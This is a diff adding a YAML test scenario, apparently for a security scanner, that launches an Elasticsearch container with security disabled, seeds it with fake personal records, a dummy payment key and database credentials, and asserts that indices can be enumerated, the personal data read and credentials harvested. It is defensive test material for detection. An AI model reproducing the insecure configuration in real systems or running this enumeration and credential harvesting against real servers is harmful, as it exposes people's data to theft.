@@ -1,0 +1,63 @@
+name: chain-elasticsearch-data-exfil
+description: >
+  Exploit chain: unauthenticated Elasticsearch → index enumeration →
+  PII/credential data extraction. Elasticsearch with security disabled
+  allows reading all indices including those containing user records,
+  API keys, and internal configuration.
+tags: [chain, postexploit, elasticsearch, data-exfil, authorized]
+
+services:
+  elasticsearch:
+    image: elasticsearch:8.13.0
+    ports: ["9402:9200"]
+    environment:
+      discovery.type: single-node
+      xpack.security.enabled: "false"
+      ES_JAVA_OPTS: "-Xms256m -Xmx256m"
+
+  seed:
+    image: curlimages/curl:latest
+    depends_on: [elasticsearch]
+    restart: "no"
+    entrypoint: ["sh", "-c"]
+    command:
+      - |
+        sleep 15
+        curl -sf -X PUT http://elasticsearch:9200/users/_doc/1 -H 'Content-Type: application/json' -d '{"name":"John Doe","email":"john@example.com","ssn":"123-45-6789","role":"admin"}'
+        curl -sf -X PUT http://elasticsearch:9200/users/_doc/2 -H 'Content-Type: application/json' -d '{"name":"Jane Smith","email":"jane@example.com","ssn":"987-65-4321","credit_card":"4111111111111111"}'
+        curl -sf -X PUT http://elasticsearch:9200/api-keys/_doc/1 -H 'Content-Type: application/json' -d '{"service":"stripe","key":"sk_live_abc123","created":"2024-01-01"}'
+        curl -sf -X PUT http://elasticsearch:9200/config/_doc/1 -H 'Content-Type: application/json' -d '{"database_url":"postgres://admin:SecretPass@10.0.1.50:5432/prod","redis_url":"redis://:AuthToken@10.0.1.51:6379"}'
+
+ready:
+  cmd: "curl -sf http://localhost:9402/_cat/indices | grep -q users"
+  timeout: 90s
+  interval: 3s
+
+assertions:
+  - name: exploit-indices-enumerable
+    type: command
+    expect:
+      command: "curl -sf http://localhost:9402/_cat/indices | grep -c '^'"
+      exit_code: 0
+
+  - name: exploit-pii-readable
+    type: command
+    expect:
+      command: "curl -sf 'http://localhost:9402/users/_search?pretty' | grep -q ssn"
+      exit_code: 0
+
+  - name: detects-elasticsearch-no-auth
+    type: beacon
+    target: "localhost:9402"
+    args: ["--no-enrich", "--scanners", "portscan", "--ports", "9402"]
+    expect:
+      check_id: port.elasticsearch_unauthenticated
+
+  - name: chain-harvests-db-credentials
+    type: beacon
+    target: "localhost:9402"
+    args: ["--no-enrich", "--scanners", "portscan", "--authorized", "--deep", "--permission-confirmed", "--ports", "9402"]
+    expect:
+      check_id: exploit.credential_harvest
+
+timeout: 10m
